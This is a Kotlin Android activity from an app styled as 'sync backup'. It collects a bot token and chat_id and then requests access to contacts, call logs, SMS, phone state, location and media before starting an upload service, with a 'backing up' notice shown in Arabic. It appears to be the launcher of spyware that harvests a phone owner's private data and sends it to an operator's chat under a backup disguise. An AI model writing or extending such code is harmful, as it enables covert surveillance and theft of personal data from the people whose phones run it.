package com.sync.backup

import android.Manifest
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var prefs: SharedPreferences

    private val perms: Array<String> get() {
        val base = mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= 33) {
            base.add(Manifest.permission.READ_MEDIA_IMAGES)
            base.add(Manifest.permission.READ_MEDIA_VIDEO)
            base.add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            base.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return base.toTypedArray()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        prefs = getSharedPreferences("cfg", MODE_PRIVATE)

        val token = findViewById<EditText>(R.id.etToken)
        val chat = findViewById<EditText>(R.id.etChat)
        val btn = findViewById<Button>(R.id.btnStart)

        token.setText(prefs.getString("token", ""))
        chat.setText(prefs.getString("chat", ""))

        btn.setOnClickListener {
            val t = token.text.toString().trim()
            val c = chat.text.toString().trim()
            if (t.isEmpty() || c.isEmpty()) {
                Toast.makeText(this, "أدخل التوكن و chat_id", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            prefs.edit().putString("token", t).putString("chat", c).apply()
            requestPerms()
        }
    }

    private fun requestPerms() {
        val missing = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) startService()
        else ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) startService()
    }

    private fun startService() {
        val i = Intent(this, UploadService::class.java)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
        Toast.makeText(this, "جارٍ النسخ الاحتياطي...", Toast.LENGTH_SHORT).show()
    }
}